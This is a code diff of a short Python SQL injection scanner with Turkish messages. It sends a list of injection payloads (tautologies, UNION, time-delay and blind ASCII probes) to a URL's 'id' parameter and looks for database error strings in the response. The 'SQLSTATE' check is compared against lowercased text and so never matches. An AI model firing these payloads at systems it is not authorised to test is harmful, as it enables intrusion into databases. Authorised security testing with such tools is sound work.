@@ -1,20 +1,20 @@
 import requests
 
-payloads = ["' OR 1=1 --", "' OR 'a'='a", "' UNION SELECT null, null, null --"]
+SQLI_PAYLOADS = [
+    "' OR 1=1--", "' OR '1'='1", "' OR 1=1#", "' UNION SELECT NULL--",
+    "' AND 1=0 --", "' OR 'a'='a", "'; WAITFOR DELAY '0:0:5'--",
+    "' AND ASCII(SUBSTRING(@@version,1,1)) > 50--"
+]
+ERROR_INDICATORS = ["sql syntax", "mysql_fetch", "native client", "SQLSTATE", "unexpected token"]
 
 def test_sql_injection(url):
     vulnerabilities = []
-    
-    for payload in payloads:
-        test_url = f"{url}?id={payload}"  # SQL Injection için parametre ekleme
+    for payload in SQLI_PAYLOADS:
+        test_url = f"{url}?id={payload}"
         try:
-            response = requests.get(test_url, timeout=5)
-            error_messages = ["sql syntax", "mysql_fetch", "native client", "SQLSTATE"]
-            for error in error_messages:
-                if error in response.text.lower():
-                    vulnerabilities.append(f"⚠️ SQL Injection açığı tespit edildi: {test_url}")
-                    break
-        except:
-            pass
-    
+            r = requests.get(test_url, timeout=5)
+            if any(error in r.text.lower() for error in ERROR_INDICATORS):
+                vulnerabilities.append(f"⚠️ SQL Injection açığı tespit edildi: {test_url}")
+        except requests.RequestException:
+            continue
     return vulnerabilities
